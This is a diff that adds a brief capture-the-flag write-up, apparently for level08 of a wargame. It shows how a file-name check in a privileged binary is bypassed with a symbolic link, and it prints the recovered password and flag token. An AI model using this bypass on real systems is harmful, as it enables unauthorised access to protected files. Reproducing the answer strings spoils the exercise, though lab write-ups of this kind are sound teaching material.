@@ -1,0 +1,15 @@
+Tried to execute ./level08
+Tried to execute ./level08 token
+got no permissions on token
+
+Tried ltrace ./level08 token.
+Found that level08 outputs file content to stdout. Impossible to read files with name containing 'token' substring.
+
+Created symbolic link in tmp:
+ln -s /home/user/level08/token /tmp/a
+./level08 /tmp/a
+quif5eloekouj29ke0vouxean
+
+su flag08
+getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
